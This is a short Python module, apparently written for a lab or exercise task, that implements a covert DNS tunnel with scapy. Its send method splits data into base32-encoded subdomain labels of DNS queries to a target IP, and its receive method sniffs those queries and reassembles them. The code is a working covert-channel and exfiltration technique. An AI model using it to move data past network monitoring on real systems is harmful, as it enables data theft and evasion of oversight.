import base64
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sniff, send
import time

class DNSTunnel:
    """
    Covert DNS Tunnel implementation.
    Encodes payload into subdomain labels.
    """
    
    @staticmethod
    def send(payload_bytes: bytes, target_ip: str, session_id: str, should_stop=None):
        # Base32 is safer for DNS labels (case insensitive, alphanumeric)
        encoded: str = base64.b32encode(payload_bytes).decode('utf-8').rstrip('=')
        
        # Max label length is 63 chars.
        # We'll use a structure: <chunk>.<session_id>.tunnel.com
        chunk_size = 60
        chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]
        
        for chunk in chunks:
            if should_stop and should_stop():
                break
            query = f"{chunk}.{session_id}.tunnel.com"
            pkt = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=query))
            send(pkt, verbose=False)
            time.sleep(0.1) # Avoid flooding

    @staticmethod
    def receive(port: int, session_id: str, timeout: int = 30):
        received_chunks = {}
        
        def packet_callback(pkt):
            if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0: # Query
                qname = pkt.getlayer(DNS).qd.qname.decode('utf-8')
                parts = qname.split('.')
                if len(parts) >= 3 and parts[1] == session_id:
                    chunk = parts[0]
                    # In a real scenario, we'd need sequence numbers.
                    # For this task, we'll assume order or append.
                    received_chunks[time.time()] = chunk

        sniff(filter=f"udp port {port}", prn=packet_callback, timeout=timeout, store=0)
        
        sorted_chunks = [received_chunks[k] for k in sorted(received_chunks.keys())]
        full_encoded = "".join(sorted_chunks)
        
        # Add padding back if needed for b32 decode
        padding = (8 - (len(full_encoded) % 8)) % 8
        return base64.b32decode(full_encoded + "=" * padding)
